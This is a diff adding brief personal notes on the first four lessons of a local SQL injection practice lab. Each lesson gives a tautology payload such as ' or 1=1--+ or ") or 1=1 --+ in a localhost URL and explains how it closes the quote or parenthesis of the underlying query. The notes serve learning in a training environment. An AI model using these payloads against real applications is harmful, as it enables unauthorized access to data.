@@ -1,0 +1,35 @@
+For some reasons , only this comment is working --+ , not -- or #
+
+lesson 1 
+
+
+id=' or 1=1--+ 
+
+This is classic plain old sql injection , close the opening quote , make condition always true by or 1=1 and comment out rest of the query . Will fetch the first row 
+from the table.
+
+
+lesson 2 
+
+
+http://localhost/Less-2/?id=20 or 1=1
+
+The injectable parameter i.e id is integer ,so no quotes to be handled here
+
+
+lesson 3
+
+
+http://localhost/Less-3/?id=') or 1=1 --+
+
+The query must be like ....where id=('<parameter>').......
+Close the parentheses and regular shit now 
+
+
+lesson 4
+
+
+http://localhost/Less-4/?id=") or 1=1 --+
+
+Close parentheses , this time double quotes . 
+
